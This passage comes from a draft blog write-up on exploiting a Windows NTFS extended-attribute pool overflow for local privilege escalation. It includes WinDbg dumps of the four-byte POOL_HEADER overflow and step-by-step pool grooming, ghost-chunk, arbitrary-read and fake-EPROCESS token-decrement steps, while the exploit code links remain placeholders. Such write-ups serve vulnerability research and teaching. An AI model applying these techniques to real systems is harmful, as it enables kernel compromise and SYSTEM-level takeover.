ffffd889`34985a80  32 32 32 00 54 68 69 73-20 69 73 20 61 20 63 6f  222.This is a co
ffffd889`34985a90  ff 6d 65 6e 74 31 32 33-41 41 41 41 42 42 42 42  .ment123AAAABBBB
ffffd889`34985aa0  43 43 43 43 44 44 44 44-45 45 45 45 46 46 46 46  CCCCDDDDEEEEFFFF
ffffd889`34985ab0  47 47 48 48 48 48 49 49-49 49 4a 4a 41 41 41 41  GGHHHHIIIIJJAAAA
ffffd889`34985ac0  42 42 42 42 43 43 43 43-44 44 44 44 45 45 45 45  BBBBCCCCDDDDEEEE
ffffd889`34985ad0  46 46 46 46 47 47 47 47-48 48 48 48 4a 4a 4a 4a  FFFFGGGGHHHHJJJJ
ffffd889`34985ae0  4b 4b 4b 4b 4c 4c 4c 4c-4d 4d 4d 4d 4e 4e 4e 4e  KKKKLLLLMMMMNNNN
ffffd889`34985af0  4f 4f 4f 4f 50 50 50 50-01 02 03 04 05 06 07 08  OOOOPPPP........
ffffd889`34985b00  01 02 03 04 05 06 07 08-01 02 03 04 05 06 07 08  ................
ffffd889`34985b10  00 00 00 00 24 00 00 00-00 00 00 00 03 00 00 00  ....$...........
ffffd889`34985b20  00 00 16 03 4e 70 41 74-00 00 00 00 00 00 00 00  ....NpAt........                // <- here a new chunk begins
ffffd889`34985b30  b0 9b 50 2c 89 d8 ff ff-b0 9b 50 2c 89 d8 ff ff  ..P,......P,....
```

And inspecting the same buffer after the third `memcpy`

```
1: kd> pc
Ntfs!NtfsCommonQueryEa+0x2bf:
fffff803`0cb8bd0f e8ec5df5ff      call    Ntfs!memcpy (fffff803`0cae1b00)

1: kd> p
Ntfs!NtfsCommonQueryEa+0x2c4:
fffff803`0cb8bd14 eb87            jmp     Ntfs!NtfsCommonQueryEa+0x24d (fffff803`0cb8bc9d)

1: kd> db ffffd889349859c0 l180
ffffd889`349859c0  00 00 16 03 4e 74 46 45-00 00 00 00 00 00 00 00  ....NtFE........
ffffd889`349859d0  9c 00 00 00 00 0f 81 00-55 53 45 52 2e 43 4f 4d  ........USER.COM
ffffd889`349859e0  4d 45 4e 54 33 32 31 00-54 68 69 73 20 69 73 20  MENT321.This is 
ffffd889`349859f0  61 20 63 6f ff 6d 65 6e-74 31 32 33 41 41 41 41  a co.ment123AAAA
ffffd889`34985a00  42 42 42 42 43 43 43 43-44 44 44 44 45 45 45 45  BBBBCCCCDDDDEEEE
ffffd889`34985a10  46 46 46 46 41 41 41 41-42 42 42 42 43 43 43 43  FFFFAAAABBBBCCCC
ffffd889`34985a20  44 44 44 44 45 45 45 45-46 46 46 46 47 47 47 47  DDDDEEEEFFFFGGGG
ffffd889`34985a30  48 48 48 48 4a 4a 4a 4a-4b 4b 4b 4b 4c 4c 4c 4c  HHHHJJJJKKKKLLLL
ffffd889`34985a40  4d 4d 4d 4d 4e 4e 4e 4e-4f 4f 4f 4f 50 50 50 50  MMMMNNNNOOOOPPPP
ffffd889`34985a50  01 02 03 04 05 06 07 08-01 02 03 04 05 06 07 08  ................
ffffd889`34985a60  01 02 03 04 05 06 07 08-00 00 00 00 a8 00 00 00  ................
ffffd889`34985a70  00 0f 8d 00 55 53 45 52-2e 43 4f 4d 4d 45 4e 54  ....USER.COMMENT
ffffd889`34985a80  32 32 32 00 54 68 69 73-20 69 73 20 61 20 63 6f  222.This is a co
ffffd889`34985a90  ff 6d 65 6e 74 31 32 33-41 41 41 41 42 42 42 42  .ment123AAAABBBB
ffffd889`34985aa0  43 43 43 43 44 44 44 44-45 45 45 45 46 46 46 46  CCCCDDDDEEEEFFFF
ffffd889`34985ab0  47 47 48 48 48 48 49 49-49 49 4a 4a 41 41 41 41  GGHHHHIIIIJJAAAA
ffffd889`34985ac0  42 42 42 42 43 43 43 43-44 44 44 44 45 45 45 45  BBBBCCCCDDDDEEEE
ffffd889`34985ad0  46 46 46 46 47 47 47 47-48 48 48 48 4a 4a 4a 4a  FFFFGGGGHHHHJJJJ
ffffd889`34985ae0  4b 4b 4b 4b 4c 4c 4c 4c-4d 4d 4d 4d 4e 4e 4e 4e  KKKKLLLLMMMMNNNN
ffffd889`34985af0  4f 4f 4f 4f 50 50 50 50-01 02 03 04 05 06 07 08  OOOOPPPP........
ffffd889`34985b00  01 02 03 04 05 06 07 08-01 02 03 04 05 06 07 08  ................
ffffd889`34985b10  00 00 00 00 00 00 00 00-00 02 05 00 41 43 00 54  ............AC.T
ffffd889`34985b20  41 41 41 41 4e 70 41 74-00 00 00 00 00 00 00 00  AAAANpAt........        // <- Overflowing four bytes into the POOL_HEADER of the next chunk
ffffd889`34985b30  b0 9b 50 2c 89 d8 ff ff-b0 9b 50 2c 89 d8 ff ff  ..P,......P,....
```

And we did overflow four bytes (`AAAA`) into the `POOL_HEADER` of the adjacent chunk. I have to say, that I reconstructed this part after I already had a successful exploit. 
The overall process to achieve it was not as straight forward as this might have looked like.

We needed to just overflow four bytes, different lengths of EA were not deemed valid by the kernel and also the overflown four bytes had to be arbitrary values, remember the EA names must be valid ASCII and we prefer to use non-ascii characters to simplify the exploitation when taking control of the next chunks `POOL_HEADER`.

This all might have been a bit rough to understand without having reversed the invovled functions and not having stepped through it in a debugger yourself, so here is a table to aid your understanding.

|Iteration|out_buf_len|block_Size|padding|if statement|
|-|-|-|-|-|
|1.|0x143|0x99|0x00|`if (0x99<(uint)(0x143-0x00))`|
|2.|0xaa|0xa5|0x03|`if (0xa5<(uint)(0xaa-0x03))`|
|3.|0x02|0x10|0x03|`if (0x10<(uint)(0x2-0x03))`|


And additionally a graphical illustration how all the three iterations now enabled us for the overflow to aid in the understanding.

![Graphical Illustration of the Overflow](images/CVE2021-Page-6.drawio.svg)


The code which allows the above is uploaded [here](TODO).

We now *just* have to apply the exploitation technique, how hard can that be? ;P



## Exploitation Technique

The exploitation technique we are going to use was presented by Corentin Bayet and Paul Fariello of Synack [link to paper](https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf).
It's a nice technique as it requires just a four byte overflow, it supports a wide range of vulnerable chunk sizes (0x130 - 0xFE0) and that it also supports Paged Pool and Non-Paged Pool alike.

Described in one sentence, by using this technique we try to modify the `POOL_HEADER` of the chunk following the vulnerable chunk to eventually allow the decrementation of two `EPROCESS.TOKEN` values of our own process for privilege escalation.
No worries if that creates a lot of questionmarks above your head, we will disect this one by one as I feel this will enable you to adopt this technique even faster when you have the given primitive or just to grasp the concept of how these kind of issues might be exploited.




---

Allocate PipeAttributes with the same size as the vulnerable objects plus the size of POOL_HEADER (0x10)

---
Create gaps for the vulnerable object (every third chunk for example)

---
Allocate vulnerable object

---
Trigger vuln to overwrite the pool header 

Previous POOL_HEADER

```

```

New POOL_HEADER
```
PreviousSize: 0x12 (will be multiplied by 0x10, current_chunk-0x120 will point to the fake pool header we are going to setup)
PoolIndex:    0x0  (can be any value, will not be used)
BlockSize:    0x0  (can be any value, will not be used)
PoolType:    PreviousPoolType | 0x4 (OR 4 to set CacheAligned bit)
```

---
Free the vulnerable object to reallocate the space with an object we have much control over (need to fake the pool header)

Faked Pool Header

```
PreviousSize: 0x0 (can be any value, will not be used)
PoolIndex:    0x0 (can be any value, will not be used)
BlockSize:    0x21 (will be multiplied with 0x10 -> hence 0x210)
PoolType:    CacheAligned & PoolQuota bits both unset
```

The `BlockSize` is the size of the chunk that will actually be freed.
Sizes from 0x200 will use the VS allocator and 0x210 is the chunk size for these objects.



---
Enable Dynamic Lookaside list.

This is crucial to the technique, after the Dynamic Lookaside list is enabled, and the chunk to be freed has the `CacheAligned` bit set within the `PoolType` the information of the faked pool header will be used and allow us to create 
a Ghost Chunk.

The paper mentions that this can be enabled for the size 0x210 for example by spraying and freeing chunks of that size. In the [PoC exploit they shared](TODO) they do it like that:
    - Spray 100 times 0x210 chunks
    - Sleep two seconds
    - Spray 100 times 0x210 chunks 
    - Sleep one second

Without freeing these chunks afterwards. I did use the same method within my exploit and it did work.

TODO: maybe show how this can be detected dynamically with a debugger



---
Free overwritten chunk with controlled pool header to create GhostChunk

---
Free & Reallocate the blue chunk (previous space of the vuln chunk) to enable leaking of Ghost Chunks' Pipe Attribute later on.

Reallocate means we need to spray again, just allocating one object/chunk will most likely not suffice.
Hence we don't know which of our newly allocated objects go into the previous chunk. But we can just iterate over all the respray pipes and read the corresponding attributes.
If one differs from the original attribute, we got the one.

---
Allocate GhostChunk

This will overwrite the previous pipe attribute we just allocated in the step before which allows us to diff.


---
Leak Pipe Attribute of GhostChunk (we can use the leaked pointers together with the following arbitrary read to leak the NT kernel base and another pointer we need further down the line)



---
Free & Reallocate the blue chunk (again, previous space of the vuln chunk) again to overwrite the `Flink` (next) pointer of the PipeAttribute of the GhostChunk to point to a fake Pipe Attribute in Userland (full control)

---
Now setting the `ValueSize` and the `AttributeValue` (pointer) within the fake Userland PipeAttribute allows for arbitrary reads.

---
From leaked root attribute address to NT base address (root pipe queue entry)

---
From `NT` base addr to EPROCESS and the `ExpPoolQuotaCookie`

The `NT` kernel (`ntoskrnl.exe`) stores two values which are of interest of us at this time. These also come with symbols. 

The first one is `PsInitialSystemProcess`, this is a pointer to the `_EPROCESS/_KPROCESS` structure of the first process. If you don't know, this structure contains a doubly-linked list which contains all running processes.
(If you would have an arbitrary read/write bug, you can for example just traverse all processes and steal the `_EPROCESS.Token` of a privileged process and write the value into your own process for LPE, this method is often times used in PoC exploits for said vuln).

```
0: kd> dq nt!PsInitialSystemProcess l1
fffff803`094fb420  ffff9b8e`89c82040
0: kd> ?nt!PsInitialSystemProcess-nt
Evaluate expression: 13612064 = 00000000`00cfb420
```

and 

```
0: kd> ?nt!ExpPoolQuotaCookie-nt
Evaluate expression: 13613520 = 00000000`00cfb9d0
```


Note: These offsets do differ for different Windows OS versions, so you either hardcode them to fit your specific OS version, have a set of different OS versions supported (with hardcoded values for each) or have a method to dynamically identify the respective offset. 


We store the `ExpPoolQuotaCookie` for the next step, then traverse the whole `_EPROCESS` linked list to get the `_EPROCESS` address of our own process. 

```
0: kd> dt nt!_EPROCESS ActiveProcessLinks
   +0x448 ActiveProcessLinks : _LIST_ENTRY
```

Remember, we want to modify the `_EPROCESS.Token` value of our own process.
To identify that the current `_EPROCESS` we are iterating over is ours, we can compare the `_EPROCESS.UniqueProcessId` value with the one we get from `_getpid()` for example. 

```
0: kd> dt nt!_EPROCESS UniqueProcessId
   +0x440 UniqueProcessId : Ptr64 Void
```


While iterating we also store the pid of a privileged process in this case `winlogon`.





---
Fake EPROCESS

The whole idea of the decrementation of an arbitrary value allowing for LPE stems from Tarjei Mandt's paper `Kernel Pool Exploitation on Windows 7`. During that time you could set the `ProcessBilled` within a POOL_HEADER and the set the `PoolQuota` flag (0x8) within the `PoolType` (with an overflow like ours), trigger a `free` of said chunk 
which then led to the execution of the following logic:

`*ProcessBilled->QuotaBlock -= BlockSize*0x10` TODO: check if it is named QuotaBlock and it is *0x10 or just BlockSize

The `ProcessBilled` was expected to be a `_EPROCESS` structure.

```
0: kd> dt nt!_EPROCESS QuotaBlock
   +0x568 QuotaBlock : Ptr64 _EPROCESS_QUOTA_BLOCK
```

However things changed, and now before dereferencing the `ProcessBilled` pointer in this situation, it expects the value to be the result of following equation:

```
ProcessBilled = _EPROCESS/_KPROCESS ^ ExpPoolQuotaCookie ^ ChunkAddr
```

~~~NoteBlock
`_EPROCESS/_KPROCESS` start addresses can be used interchangebly as `_KPROCESS` is the first structure within `_EPROCESS`.

```
0: kd> dt nt!_EPROCESS 
   +0x000 Pcb              : _KPROCESS
```
~~~

Hence when creating a fake `_EPROCESS` structure we need to take this into account and write the value accordingly. The `ChunkAddr` and the `ExpPoolQuotaCookie` is already known to us, the `_EPROCESS` address is the one we want to point to 
our fake `_EPROCESS`


Also these fake `_EPROCESS`s have to reside in kernel address space. How do we get them into there and where can we retrieve the address of said allocation?
Meet Windows Kernel Hackers favorite `PipeQueueEntry`, first publicly discussed to my knowledge by Alex Ionescu in [Sheep Year Kernel Heap Fengshui: Spraying in the Big Kidsâ€™ Pool](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/).

It gives us great control over the data within the allocation and also of the size of the allocation. We can just use `WriteFile` into the `GhostChunk`s pipe with two faked `_EPROCESS` structures in one go, we need one `_EPROCESS` for each decrement
we want to achieve. Why we need two will become clear within the next sections, don't worry.

Remember the leaked `RootPipeQueueEntry` when leaking the `GhostChunk` Attributes? This pointer holds the address of the `PipeQueueEntry` containing our two freshly faked `_EPROCESS` structures (at an offset)

TODO: DiagramXX


IMAGE _EPROCESSs

---
XX TODO XX

---
Setup Decrement 1 

---
Setup Decrement 2

---
Get `SeDebugPrivilege` and inject into remote process


As some final notes about this or any exploitation technique, for me it is crucial to take this step-by-step. Not getting discouraged by all the further steps, the seemingly unfavourable amount of stars which might have to be aligned to make this a success. 
Also the most important thing here is to understand the step you are doing currently and how to confirm that it does work before moving on, where do I set breakpoints, where do I use `getchar()` within my exploit to not continue directly, what do I need to confirm within memory.


## Exploit in Action

Below you can see the exploit in action, it fails the first two times but finally succeeds and we are able to pop a `SYSTEM` shell. 
I decided to use that video instead of trying to record a perfect run as (at least my version) does rely a bit on luck to get all the spraying right ;)





You can find the final exploit [here](TODO)



## Further Improvement?
* Paged Pool layout



## Getting Started

If you want to get started with Windows Kernel Exploitation, here is my suggestion:

1. Read [Windows Drivers Reverse Engineering Methodology](https://voidsec.com/windows-drivers-reverse-engineering-methodology/)
2. Setup two VMs Windows 10/11, [1](https://voidsec.com/windows-drivers-reverse-engineering-methodology/#remote-kernel-debugging) [2](https://www.vulndev.io/2022/07/01/windows-kernel-exploitation-vm-setup/)
3. See Vulnerabilities -> Write Exploits:
    - Exploit the Stack Overflow of HEVD with a [tutorial](https://www.vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/)
    - Exploit the Arbitrary Read/Write of HEVD with a tutorial
    - Exploit Arbitrary Read/Write within `dbutil_2_3.sys` (giyf)
6. Do the courses [Debuggers 3011: Advanced WinDbg](https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg3011_WinDbg3+2023_v1/about) and [Exploitation 4011: Windows Kernel Exploitation: Race Condition + UAF in KTM](https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Exp4011_Windows_Kernel_UAF_KTM+2023_v1/about)


While doing the above, the more you do on your own and don't rely on writeups the more skilled you will get. It's more time consuming and can be a toll, but it's totally worth it!

